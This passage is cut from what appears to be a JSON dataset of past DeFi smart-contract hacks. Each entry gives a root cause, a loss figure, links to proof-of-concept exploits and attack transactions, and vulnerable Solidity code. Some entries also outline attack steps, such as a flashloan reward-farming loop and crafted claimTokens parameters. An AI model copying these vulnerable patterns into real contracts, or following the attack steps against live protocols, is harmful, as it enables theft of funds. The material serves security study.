        "vulnerable_code_snippet": "function transferLockToken(address _wallet, uint256 _amount) public {\n    users[_wallet].lockedBalance = users[_wallet].lockedBalance.add(_amount);\n    users[_wallet].unlockPerSecond = users[_wallet].lockedBalance.mul(unlockPercent).div(100).div(duration);\n\n    super.transfer(_wallet, _amount);\n}\n\nfunction batchTransferLockToken(Airdrop[] memory _airdrops) public {\n    for (uint256 i = 0; i < _airdrops.length; i++) {\n        // don't use this.transferTokenLock because payer modifier\n        address wallet = _airdrops[i].wallet;\n        uint256 amount = _airdrops[i].amount;\n\n        users[wallet].lockedBalance = users[wallet].lockedBalance.add(amount);\n        users[wallet].unlockPerSecond = users[wallet].lockedBalance.mul(unlockPercent).div(100).div(duration);\n\n        super.transfer(wallet, amount);\n    }\n}\n\nfunction transfer(address _to, uint256 _amount) public override returns (bool) {\n    uint256 availableAmount = getAvailableBalance(_msgSender());\n    require(availableAmount >= _amount, \"Not Enough Available Token\");\n\n    return super.transfer(_to, _amount);\n}"
    },
    {
        "type": "Dex/AMM, Incorrect logic",
        "date": "20231115",
        "title": "LinkDAO",
        "root_cause": "This project is similar to Uniswap V2 and has a swap function. At the end of the function, there should be a correct `K` verification. In Uniswap V2, which takes a 0.3% protocol fee, the verification is as follows:\n\n```solidity\nuint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\nuint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\nrequire(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n```\nIt seems the victim contract takes a 0.03% protocol fee, but the verification is incorrect; it should multiply by (10000**2) instead of (1000**2).",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/LinkDao_exp.sol",
        "attack_tx": "[0x4ed59e3013215c2725 | Phalcon Explorer](https://explorer.phalcon.xyz/tx/bsc/0x4ed59e3013215c272536775a966f4365112997a6eec534d38325be014f2e15ee)",
        "analysis": "[BlockSec Phalcon on Twitter / X](https://x.com/phalcon_xyz/status/1725058908144746992)",
        "vulnerable_code_snippet": "uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\nuint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\nrequire(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n"
    },
    {
        "type": "Access Control, Lack of permission control",
        "date": "20240601",
        "title": "VeloCore",
        "root_cause": "Lacks permission verification (velocore__execute). The LP Pool lacks permission verification. The attacker directly invoke the velocore__execute function (0xec378808) of the LP contract with a carefully constructed parameter to manipulate the feeMultiplier parameter of the contract.",
        "attack_tx": "https://lineascan.build/tx/0xed11d5b013bf3296b1507da38b7bcb97845dd037d33d3d1b0c5e763889cdbed1",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Velocore_exp.sol",
        "analysis": "The LP Pool lacks permission verification. The attacker directly invoke the velocore__execute function (0xec378808) of the LP contract with a carefully constructed parameter to manipulate the feeMultiplier parameter of the contract.",
        "vulnerable_code": "https://lineascan.build/address/0xb7f6354b2cfd3018b3261fbc63248a56a24ae91a",
        "vulnerable_code_snippet": "function velocore_execute(address, Token[] calldata tokens, int128[] memory r, bytes calldata data) external returns (int128[] memory, int128[] memory) {\n    if (data.length > 0) {\n        _return_logarithmic_swap();\n    }\n    uint256 effectiveFee9 = fee9;\n    if (lastWithdrawTimestamp == block.timestamp) {\n        unchecked {\n            effectiveFee9 = effectiveFee9 * feeMultiplier / 1e9;\n        }\n    }\n} ... if (iLp != type(uint256).max && r.u(iLp) > 0) {\n    _simulateBurn(uint256(int256(r.u(iLp))));\n    if (lastWithdrawTimestamp != block.timestamp) {\n        feeMultiplier = 1e9;\n        lastWithdrawTimestamp = uint32(block.timestamp);\n    }\n    feeMultiplier = (feeMultiplier * invariantMax / (invariantMax - uint256(int256(r.u(iLp)))).toUint128();\n} else if (iLp != type(uint256).max && r.u(iLp) < 0) {\n    _simulateMint(uint256(int256(-r.u(iLp))));\n}\nreturn (new int128[](tokens.length), r);"
    },
    {
        "type": "Business Logic Flaw, Reentrancy",
        "date": "20240324",
        "lost": "348BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ARK_exp.sol",
        "title": "ARK",
        "root_cause": "Business Logic Flaw, Hacker can destroy the ARK Token in the trading pair, causing the price of ARK Token in the pair to increase. Finally, the attacker exchanges a small amount of ARK Token",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0xe8b0131fa14d0a96327f6b5690159ffa7650d66376db87366ba78d91f17cd677",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1771728823534375249",
        "vulnerable_code_snippet": "function autoBurnLiquidityPairTokens() public {\n    lastLpBurnTime = block.timestamp;\n    uint256 liquidityPairBalance = balanceOf(_mainPair);\n    uint256 amountToBurn = (liquidityPairBalance * percentForLPBurn) / 10000;\n    if (amountToBurn > 0) {\n        _basicTransfer(_mainPair, address(0xdead), amountToBurn);\n    }\n    ISwapPair(_mainPair).sync();\n    emit AutoNukeLP();\n}"
          
    },
    {
        "type": "Reentrancy",
        "date": "20230405",
        "title": "Sentiment",
        "root_cause": "Attacker re enter Balancer Vaults execute malicious code before pool balances were updated and steal money using overpriced collateral. the `_joinOrExit` function is called whenever the `joinPool` or `exitPool` is called by an external protocol user.",
        "attack_tx": "https://arbiscan.io/tx/0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Sentiment_exp.sol",
        "analysis": [
            "https://twitter.com/peckshield/status/1643417467879059456",
            "https://twitter.com/spreekaway/status/1643313471180644360",
            "https://medium.com/coinmonks/theoretical-practical-balancer-and-read-only-reentrancy-part-1-d6a21792066c",
            "https://forum.balancer.fi/t/reentrancy-vulnerability-scope-expanded/4345"
        ],
        "Lost": "$1M",
        "vulnerable_code_snippet": "function joinPool(\n        bytes32 poolId,\n        address sender,\n        address recipient,\n        JoinPoolRequest memory request\n    ) external payable override whenNotPaused {\n        // This function doesn't have the nonReentrant modifier: it is applied to `_joinOrExit` instead.\n\n        // Note that `recipient` is not actually payable in the context of a join - we cast it because we handle both\n        // joins and exits at once.\n        _joinOrExit(PoolBalanceChangeKind.JOIN, poolId, sender, payable(recipient), _toPoolBalanceChange(request)); //vulnerable point\n    }\n\nfunction _joinOrExit(\n        PoolBalanceChangeKind kind,\n        bytes32 poolId,\n        address sender,\n        address payable recipient,\n        PoolBalanceChange memory change\n    ) private nonReentrant withRegisteredPool(poolId) authenticateFor(sender) {  //vulnerable point\n        // This function uses a large number of stack variables (poolId, sender and recipient, balances, amounts, fees,\n        // etc.), which leads to 'stack too deep' issues. It relies on private functions with seemingly arbitrary\n        // interfaces to work around this limitation.\n\n        InputHelpers.ensureInputLengthMatch(change.assets.length, change.limits.length);\n\n        // We first check that the caller passed the Pool's registered tokens in the correct order, and retrieve the\n        // current balance for each.\n        IERC20[] memory tokens = _translateToIERC20(change.assets);\n        bytes32[] memory balances = _validateTokensAndGetBalances(poolId, tokens);\n        ..."
    },
    {
        "type": "Insufficient validation",
        "date": "20231220",
        "title": "TransitFinance",
        "root_cause": "Root cause:  1. The vulnerability's root cause was the lack of proper input validation. 2. The vulnerability allowed the attacker to use a forged pool and manipulate the WBNB/BUSD pool path. It can be seen on the vulnerable contract that along the swapping route, the pre-deployed fake token pair would return a false value without actually transferring any tokens to mislead the transit finance route into validating the unexpected swap. 3. The attacker manipulated the first swap by controlling the actualAmountIn parameter, substituting it with a forged value. 4. This led to the SwapRouter using the manipulated actualAmountIn as the initial value for the swap in the WBNB/BUSD pool.",
        "POC": "https://www.oklink.com/es-la/multi-search#key=0x93ae5f0a121d5e1aadae052c36bc5ecf2d406d35222f4c6a5d63fef1d6de1081",
        "POC_blocksec": "https://app.blocksec.com/explorer/tx/bsc/0x93ae5f0a121d5e1aadae052c36bc5ecf2d406d35222f4c6a5d63fef1d6de1081",
        "fake_pool": "0x36696169C63e42cd08ce11f5deeBbCeBae652050",
        "analysis": [
            "https://blog.solidityscan.com/transit-finance-hack-analysis-998400e2bd0c",
            "https://lunaray.medium.com/transitfinace-hack-analysis-9304a4863aaa",
            "https://blog.verichains.io/p/decoding-transit-finance-attack"
        ],
        "vulnerable_code_snippet": "function _executeV3Swap(ExactInputV3SwapParams calldata params) internal nonReentrant whenNotPaused returns (uint256 returnAmount) {\n    require(params.pools.length > 0, \"Empty pools\");\n    require(params.deadline >= block.timestamp, \"Expired\");\n    require(_wrapped_allowed[params.wrappedToken], \"Invalid wrapped address\");\n    address tokenIn = params.srcToken;\n    address tokenOut = params.dstToken;\n    uint256 actualAmountIn = calculateTradeFee(true, params.amount, params.fee, params.signature);\n    uint256 toBeforeBalance;\n    bool isToETH;\n    if (TransferHelper.isETH(params.srcToken)) {\n        tokenIn = params.wrappedToken;\n        require(msg.value == params.amount, \"Invalid msg.value\");\n        TransferHelper.safeDeposit(params.wrappedToken, actualAmountIn);\n    } else {\n        TransferHelper.safeTransferFrom(params.srcToken, msg.sender, address(this), params.amount);\n    }\n\n    if (TransferHelper.isETH(params.dstToken)) {\n        tokenOut = params.wrappedToken;\n        toBeforeBalance = IERC20(params.wrappedToken).balanceOf(address(this));\n        isToETH = true;\n    } else {\n        toBeforeBalance = IERC20(params.dstToken).balanceOf(params.dstReceiver);\n    }\n\n    {\n        uint256 len = params.pools.length;\n        address recipient = address(this);\n        bytes memory tokenInAndPoolSalt;\n        if (len > 1) {\n            address thisTokenIn = tokenIn;\n            address thisTokenOut = address(0);\n            for (uint256 i; i < len; i++) {\n                uint256 thisPool = params.pools[i]; // <-- Vulnerable point\n                (thisTokenIn, tokenInAndPoolSalt) = _verifyPool(thisTokenIn, thisTokenOut, thisPool);\n                if (i == len - 1 && !isToETH) {\n                    recipient = params.dstReceiver;\n                    thisTokenOut = tokenOut;\n                }\n                actualAmountIn = _swap(recipient, thisPool, tokenInAndPoolSalt, actualAmountIn);\n            }\n            returnAmount = actualAmountIn;\n        } else {\n            (, tokenInAndPoolSalt) = _verifyPool(tokenIn, tokenOut, params.pools[0]);\n            if (!isToETH) {\n                recipient = params.dstReceiver;\n            }\n            returnAmount = _swap(recipient, params.pools[0], tokenInAndPoolSalt, actualAmountIn);\n        }\n    }\n} ... uint256 len = params.pools.length;\naddress recipient = address(this);\nbytes memory tokenInAndPoolSalt;\nif (len > 1) {\n    address thisTokenIn = tokenIn;\n    address thisTokenOut = address(0);\n    for (uint256 i; i < len; i++) {\n        uint256 thisPool = params.pools[i];\n\n        if (i == len - 1 && !isToETH) {\n            recipient = params.dstReceiver;\n            thisTokenOut = tokenOut;\n        }\n        // fake pool -> WBNB/BUSD\n        (thisTokenIn, tokenInAndPoolSalt) = _verifyPool(thisTokenIn, thisTokenOut, thisPool);\n        actualAmountIn = _swap(recipient, thisPool, tokenInAndPoolSalt, actualAmountIn);\n    }\n    returnAmount = actualAmountIn;\n} else {\n    (tokenInAndPoolSalt) = _verifyPool(tokenIn, tokenOut, params.pools[0]);\n    if (!isToETH) {\n        recipient = params.dstReceiver;\n    }\n    returnAmount = _swap(recipient, params.pools[0], tokenInAndPoolSalt, actualAmountIn);\n}"
    },
    {
        "type": "Sandwich",
        "date": "20240408",
        "title": "SQUID",
        "root_cause": "In the victim contract, there are functions for swapping old tokens for new ones and vice versa. The \"sellSwappedTokens\" function performs the swap using PancakeSwap. The hacker exploited this by sandwiching the exchange, resulting in a gain of $87k.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x9fcf38d0af4dd08f4d60f7658b623e35664e74bca0eaebdb0c3b9a6965d6257b",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SQUID_exp.sol",
        "analysis": "https://twitter.com/0xNickLFranklin/status/1777235767577964980",
        "vulnerable_code_snippet": "function sellSwappedTokens(uint256 sellOption) external nonReentrant lock {\n    require(swapEnabled, \"Swap is not enabled yet\");\n    uint256 sellAmount;\n    // uint256 sellAmount = totalSwappedToSell > 500000 ether ? 500000 ether : totalSwappedToSell;\n    if (sellOption == 1) {\n        sellAmount = totalSwappedToSell > ALTERNATIVE_SELL_AMOUNT ? ALTERNATIVE_SELL_AMOUNT : totalSwappedToSell;\n    } else {\n        sellAmount = totalSwappedToSell > DEFAULT_SELL_AMOUNT ? DEFAULT_SELL_AMOUNT : totalSwappedToSell;\n    }\n\n    require(sellAmount > 0, \"No tokens to sell\");\n\n    uint256 squidV2BalanceBefore = newSquidToken.balanceOf(address(this));\n\n    // Set slippage to 5%\n    uint256 minOut = getMinOut(sellAmount);\n\n    // Approve the router to spend SQUID V1\n    oldSquidToken.approve(address(pancakeRouter), sellAmount);\n\n    address;\n    path[0] = address(oldSquidToken);\n    path[1] = addressWBNB;\n    path[2] = address(newSquidToken);\n\n    pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        sellAmount,\n        minOut, // Min amount out after slippage\n        path,\n        address(this),\n        block.timestamp\n    );\n\n    // Update totalSwappedToSell\n    totalSwappedToSell -= sellAmount;\n\n    // Calculate the amount of new SQUID V2 to burn\n    uint256 newSquidBalance = newSquidToken.balanceOf(address(this));\n\n    uint256 burnSquidV2Amount = newSquidBalance - squidV2BalanceBefore;\n    // Assuming SQUID V2 has a burn function or sending to a dead address\n    // newSquidToken.burn(newSquidBalance); // Implement if burn function exists\n    // newSquidToken.transfer(0x000000000000000000000000000000000000dEaD, burnSquidV2Amount); // Send to dead address to \"burn\"\n\n    if (burnSquidV2Amount > 0) {\n        // Burn the SQUID V2 tokens by transferring to a dead address\n        newSquidToken.transfer(0x000000000000000000000000000000000000dEaD, burnSquidV2Amount);\n    }\n}"
    },
    {
        "type": "Flashloans",
        "date": "20221202",
        "lost": "$170k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Overnight_exp.sol",
        "title": "OverNight",
        "root_cause": "Flashloan - force investment",
        "vulnerable_code_snippet": "https://snowtrace.io/address/0xed2a7edd7413021d440b09d654f3b87712abab66#code#F24#L731",
        "image": "peckshield",
        "attack_tx": "https://explorer.phalcon.xyz/tx/avax/0xf10807f9a675dd2db9a45e39f37c68a4116006f9a40e97a68c145e3859557809",
        "analysis": [
            "https://twitter.com/peckshield/status/1598704809690877952",
            "https://twitter.com/overnight_fi/status/1572614168976691200",
            "https://medium.com/coinmonks/psa-in-crypto-transparency-doesnt-necessarily-equal-safety-86b23ae9f471"
        ]
    },
    {
        "type": "Flashloans, Slippage",
        "date": "20240401",
        "lost": "$182K USD",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/ATM_exp.sol",
        "title": "ATM",
        "root_cause": "A flawed transfer implementation leads to the attack. The root cause was using a swap to convert BNB to BUSDT for dividend payments, allowing the attacker to perform a sandwich attack. The attacker repeatedly transferred ATM tokens to the PancakeSwap pool and called the skim function, exploiting the bad implementation. As you can see, there is no slippage check in the swap operation.",
        "attack_tx": "[0xee10553c26742bec9a | Phalcon Explorer](https://phalcon.blocksec.com/explorer/tx/bsc/0xee10553c26742bec9a4761fd717642d19012bab1704cbced048425070ee21a8a?line=2)",
        "analysis": "[Nick L. Franklin on Twitter / X](https://twitter.com/0xNickLFranklin/status/1775008489569718508)",
        "vulnerable_code_snippet": "function swapTokensForCurrency(uint256 tokenAmount) private {\n    address;\n    path[0] = address(this);\n    path[1] = currency;\n\n    _approve(address(this), address(_swapRouter), tokenAmount);\n\n    // make the swap\n    try\n        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            address(_tokenDistributor),\n            block.timestamp\n        )\n    {} catch {\n        emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            1\n        );\n    }\n\n    uint256 currencyBal = IERC20(currency).balanceOf(\n        address(_tokenDistributor)\n    );\n    if (currencyBal != 0) {\n        IERC20(currency).transferFrom(\n            address(_tokenDistributor),\n            address(this),\n            currencyBal\n        );\n    }\n}"
    },
    {
        "type": "Dex/AMM, Insufficient validation",
        "date": "20221002",
        "title": "Transit Swap",
        "root_cause": "Incorrect owner address validation. You can input any innocent user who granted approvals to `0xed1afc8c4604958c2f38a3408fa63b32e737c428` before. 2.Contract `0xed1afc8c4604958c2f38a3408fa63b32e737c428` will perform transferFrom to transfer amount of innocent user to attacker. `function`: `claimTokens(address token,address from,address to,uint256 amount)`,`params`: [`0x55d398326f99059fF775485246999027B3197955`,`0x1aAe0303f795b6FCb185ea9526Aa0549963319Fc`,`0x75F2abA6a44580D7be2C4e42885D4a1917bFFD46`, `6312858905558909501615`",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221002-transit-swap---incorrect-owner-address-validation",
        "analysis": [
            "1.You can input any innocent user who granted approvals to \"0xed1afc8c4604958c2f38a3408fa63b32e737c428\" before.",
            "2.Contract \"0xed1afc8c4604958c2f38a3408fa63b32e737c428\" will perform transferFrom to transfer amount of innocent user to attacker.",
            "3. \n\"function\": \"claimTokens(address token,address from,address to,uint256 amount)\",\n\"params\": [        \"0x55d398326f99059fF775485246999027B3197955\",\"0x1aAe0303f795b6FCb185ea9526Aa0549963319Fc\",\n0x75F2abA6a44580D7be2C4e42885D4a1917bFFD46\",\n\"6312858905558909501615\"]",
            "4. No owner address validation"
        ],
        "lost": "$21 M",
        "vulnerable_code_snippet": "function claimTokens(address varg0, address varg1, address varg2, uint256 varg3) public payable {\n    require(msg.data.length - 4 >= 128);\n\n    require(varg0 == varg1);\n    // No owner address validation\n    require(varg2 == varg2);\n\n    v0 = v1 = msg.sender == _claimTokens;\n\n    if (msg.sender != _claimTokens) {\n        v0 = 0xff & owner_3[msg.sender];\n    }\n    require(v0, 'XswapApprove: Access restricted');\n    if (varg3) {\n        MEM[36 + MEM[64] + 32] = varg2;\n        MEM[36 + MEM[64] + 64] = varg3; // transferFrom\n        MEM[MEM[64] + 32] = varg1 & 0xffffffffffffffffffffffffffffffffffffffffffffffff | 0x23b872dde0e0...;\n        v2 = v3 = 0;\n        while (v2 < 100) {\n            MEM[v2 + MEM[64]] = MEM[32 + (MEM[64] + v2)];\n            v2 += 32;\n        }\n    }\n}"
    },
    {
        "type": "Flashloans, staking",
        "date": "20230103",
        "title": "GDS",
        "lost": "$180k",
        "root_cause": "Abused the LP Mining mechanism.  The attacker abused the LP Mining mechanism of the GDS token by first adding liquidity with flashloan, and then using multiple contracts to collect rewards.  GDS token will reward the users who add liquidity to (GDS, USDT) pair in each epoch and the reward amount lpRewardAmount = x * LP token holding amount / LP token total supply (x is a global variable). Thus, the more staking amount, the more rewards users can get.  Borrowing 2.38M USDT token with flashloan.  Swapping 0.6M USDT token for 3.4M GDS token.  Adding liquidity for PancakeSwap (1.7M USDT and 3.4M GDS) and get 2.2M LP tokens.  Collecting rewards from GDS token contract and transferring LP tokens to another new contract.  Repeating step 4 for more than 70 times.  Removing liquidity and repaying the flashloan.  1.Borrowing 2.38M USDT token with flashloan.  1. Swapping 0.6M USDT token for 3.4M GDS token. 2. Adding liquidity for PancakeSwap (1.7M USDT and 3.4M GDS) and get 2.2M LP tokens. 3. Collecting rewards from GDS token contract and transferring LP tokens to another new contract.  5.Repeating step 4 for more than 70 times.  6.Removing liquidity and repaying the flashloan.  1.Borrowing 2.38M USDT token with flashloan.  1. Swapping 0.6M USDT token for 3.4M GDS token. 2. Adding liquidity for PancakeSwap (1.7M USDT and 3.4M GDS) and get 2.2M LP tokens. 3. Collecting rewards from GDS token contract and transferring LP tokens to another new contract.  5.Repeating step 4 for more than 70 times.  6.Removing liquidity and repaying the flashloan.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/GDS_exp.sol",
        "attack_tx": [
            "https://bscscan.com/tx/0xf9b6cc083f6e0e41ce5e5dd65b294abf577ef47c7056d86315e5e53aa662251e",
            "https://bscscan.com/tx/0x2bb704e0d158594f7373ec6e53dc9da6c6639f269207da8dab883fc3b5bf6694"
        ],
        "analysis": [
            "https://twitter.com/peckshield/status/1610095490368180224",
            "https://twitter.com/BlockSecTeam/status/1610167174978760704"
        ],
        "vulnerable_code_snippet": "function _settlementLpMining(address _from) internal {\n    uint256 _lpTokenBalance = IERC20(gdsUsdtPair).balanceOf(_from);\n    uint256 _lpTokenTotalSupply = IERC20(gdsUsdtPair).totalSupply();\n    if (lastEpoch[_from] > 0 && currentEpoch > lastEpoch[_from] && _lpTokenBalance > 0) {\n        uint256 _totalRewardAmount = 0;\n        for (uint i = lastEpoch[_from]; i < currentEpoch; i++) {\n            _totalRewardAmount += everyEpochLpReward[i];\n            _totalRewardAmount += everyDayLpMiningAmount;\n        }\n\n        uint256 _lpRewardAmount = _totalRewardAmount * _lpTokenBalance / _lpTokenTotalSupply;\n        _internalTransfer(lpPoolContract, _from, _lpRewardAmount, 4);\n\n        lastEpoch[_from] = currentEpoch;\n    }\n\n    if (lastEpoch[_from] == 0 && _lpTokenBalance > 0) {\n        lastEpoch[_from] = currentEpoch;\n    }\n\n    if (_lpTokenBalance == 0) {\n        lastEpoch[_from] = 0;\n    }\n}"

    },
    {
        "type": "Business Logic Flaw",
        "date": "20240611",
        "title": "JokInTheBox",
        "root_cause": "Hacker could unstake several times because `unstake` function doesn't check `unstaked` value.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0xe8277ef6ba8611bd12dc5a6e7ca4b984423bc0b3828159f83b466fdcf4fe054f",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/JokInTheBox_exp.sol",
        "analysis": "https://x.com/0xNickLFranklin/status/1800355604692910571",
        "vulnerable_code_snippet": "function unstake(uint256 stakeIndex) external {\n    require(stakeIndex < stakes[msg.sender].length, \"Invalid stake index!\");\n    Stake memory currentStake = stakes[msg.sender][stakeIndex];\n\n    uint256 currentDay = getCurrentDay();\n\n    require(currentDay > currentStake.stakedDay + currentStake.lockPeriod, \"Lock period has not finalized!\");\n    stakes[msg.sender][stakeIndex].unstaked = true; // <-- vulnerable point\n    stakes[msg.sender][stakeIndex].unstakedDay = currentDay;\n\n    totalStaked -= currentStake.amountStaked;\n    // Transfer back staked amount\n    require(jokToken.transfer(msg.sender, currentStake.amountStaked), \"Token transfer failed!\");\n\n    emit Unstake(msg.sender, currentStake.amountStaked, block.timestamp, currentStake.lockPeriod, stakeIndex);\n}"
    },
    {
        "type": "Incorrect logic",
        "date": "20221116",
        "title": "SheepFarm",
        "root_cause": "The root cause of the attack is that the function `register` can be repeatedly invoked by the same account. 1. The attacker repeatedly invokes the `register` function to increase the GEM bonus   2.  The attacker invokes `addGems` and `upgradeVillage`, to update GEM value and accumulate yield  1. The attacker invokes `sellVillage` to convert GEM to money 2. Then withdraw the money(BNB) via `withdrawMoney`",
        "attack_tx": "https://bscscan.com/tx/0x5735026e5de6d1968ab5baef0cc436cc0a3f4de4ab735335c5b1bd31fa60c582",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/SheepFram_exp.sol",
        "vulnerable_code": "https://bscscan.com/address/0x4726010da871f4b57b5031e3ea48bde961f122aa#code",
        "analysis": [
            "1. The attacker repeatedly invokes the `register` function to increase the GEM bonus",
            "2.  The attacker invokes `addGems` and `upgradeVillage`, to update GEM value and accumulate yield",
            "1. The attacker invokes `sellVillage` to convert GEM to money",
            "2. Then withdraw the money(BNB) via `withdrawMoney`"
        ],
        "additional_info": [
            "https://twitter.com/AnciliaInc/status/1592658104394473472",
            "https://twitter.com/BlockSecTeam/status/1592734292727455744"
        ],
        "lost": "1BNB",
        "vulnerable_code_snippet": "function register(address neighbor) external initialized {\n    address user = msg.sender;\n    require(villages[user].timestamp == 0, \"just new users\"); //@audit not updated while the new user creation\n    uint256 gems;\n    totalVillages++;\n    if (villages[neighbor].sheeps[0] > 0 && neighbor != manager) {\n        gems += GEM_BONUS * 2;\n    } else {\n        neighbor = manager;\n        gems += GEM_BONUS;\n    }\n    villages[neighbor].neighbors++;\n    villages[user].neighbor = neighbor;\n    villages[user].gems += gems;\n    emit Newbie(msg.sender, gems);\n}"
    },
    {
        "type": "Access Control, Price Manipulation",
        "date": "20230227",
        "title": "LaunchZone",
        "lost": "$320,000",
        "root_cause": "Contract X mentioned above is the implementation contract of SwapX Proxy (not yet verified and audited), the Proxy will allow users to pass data and call the implementation contract:",
        "attack_tx": "https://bscscan.com/tx/0xaee8ef10ac816834cd7026ec34f35bdde568191fe2fa67724fcf2739e48c3cae",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/LaunchZone_exp.sol",
        "analysis": [
            "https://blog.verichains.io/p/analyzing-the-lz-token-hack",
            "https://twitter.com/immunefi/status/1630210901360951296"
        ],
        "vulnerable_code_snippet": "function swap(\n        IERC20 srcToken,\n        IERC20 dstToken,\n        address dstReceiver,\n        uint256 amount,\n        uint256 minReturnAmount,\n        address referrer,\n        bytes calldata data\n    ) \n        external \n        payable \n        whenNotPaused\n        returns (uint256 returnAmount)\n    {\n        require(minReturnAmount > 0, \"Min return should not be 0\");\n        require(data.length > 0, \"Call data should exist\");\n\n        dstReceiver = (dstReceiver == address(0)) ? msg.sender : dstReceiver;\n        uint256 initialSrcBalance = srcToken.universalBalanceOf(msg.sender);\n        uint256 initialDstBalance = dstToken.universalBalanceOf(dstReceiver);\n\n        {\n        (bool success, bytes memory returndata) = swapXImpl.call{value: msg.value}(data); //vulnerable point\n        if (!success)  {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(\"swap failed\");\n            }\n        }\n        }"
    },
    {
        "type": "Dex/AMM, Miscalculation",
        "date": "20210915",
        "lost": "$1 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210915-nowswap-platform",
        "title": "NowSwap",
        "root_cause": "Incorrect calculation",
        "analysis": "Same Uranium, NowSwap and Nimbus issue\nVulnerable code snippet:\ninconsistent value in the code, 10000 vs 1000\n[https://etherscan.io/address/0xa14660a33cc608b902f5bb49c8213bd4c8a4f4ca#code](https://etherscan.io/address/0xa14660a33cc608b902f5bb49c8213bd4c8a4f4ca#code) unverified contract",
        "attack_tx": null
    },
    {
        "type": "ERC721, Unchecked User Input",
        "date": "20240216",
        "lost": "50k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/ParticleTrade_exp.sol",
        "title": "ParticleTrade",
        "root_cause": "Attacker use `onERC721Received` override the value of `lien.tokenId` , and then call accountBalance again. At last use `withdrawAccountBalance` to withdraw `$ETH` as same as `accoundBalance`.",
        "attack_tx": "https://etherscan.io/tx/0xd9b3e229acc755881890394cc76fde0d7b83b1abd4d046b0f69c1fd9fd495ff6",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1758028270770250134"
    },
    {
        "type": "Bridge, CrossChain, Insufficient validation, lending",
        "date": "20220128",
        "title": "Qubit Finance",
        "lost": "$80 M",
        "fixed": "fixed",
        "root_cause": "Insufficient validation. `safeTransferFrom()` in SafeToken.sol does not revert when the token EOA. tokenAddress can be address(0) to pass all check to mint xETH.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220128-qubit-finance---bridge-address0safetransferfrom-does-not-revert",
        "vulnerable_code_snippet": "function deposit(uint8 destinationDomainID, bytes32 resourceID, bytes calldata data) external payable notPaused {\n    require(msg.value == fee, \"QBridge: invalid fee\");\n\n    address handler = resourceIDToHandlerAddress[resourceID];\n    require(handler != address(0), \"QBridge: invalid resourceID\");\n\n    uint64 depositNonce = ++_depositCounts[destinationDomainID];\n\n    IQBridgeHandler(handler).deposit(resourceID, msg.sender, data);\n    emit Deposit(destinationDomainID, resourceID, depositNonce, msg.sender, data);\n}\n\nQBridgeHandler\nfunction deposit(bytes32 resourceID, address depositer, bytes calldata data) external override onlyBridge {\n    uint option;\n    uint amount;\n    (option, amount) = abi.decode(data, (uint, uint));\n\n    address tokenAddress = resourceIDToTokenContractAddress[resourceID]; //without any tokenAddress check\n    require(contractWhitelist[tokenAddress], \"provided tokenAddress is not whitelisted\");\n\n    if (burnList[tokenAddress]) {\n        require(amount >= withdrawalFees[resourceID], \"less than withdrawal fee\");\n        QBridgeToken(tokenAddress).burnFrom(depositer, amount);\n    } else {\n        require(amount >= minAmounts[resourceID][option], \"less than minimum amount\");\n        tokenAddress.safeTransferFrom(depositer, address(this), amount);  //vulnerable point\n    }\n}\n\n/*\n\"input\":{\n\"token\":\"0x0000000000000000000000000000000000000000\"\n\"from\":\"0xd01ae1a708614948b2b5e0b7ab5be6afa01325c7\"\n\"to\":\"0x17b7163cf1dbd286e262ddc68b553d899b93f526\"\n\"value\":\"190000000000000000000\"\n}\n*/\nSafeToken.sol\nfunction safeTransferFrom(\n        address token,\n        address from,\n        address to,\n        uint value\n    ) internal {\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), \"!safeTransferFrom\");\n    } ... function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {\n    callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n}\n\nfunction callOptionalReturn(IERC20 token, bytes memory data) private {\n    // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\n    // we're implementing it 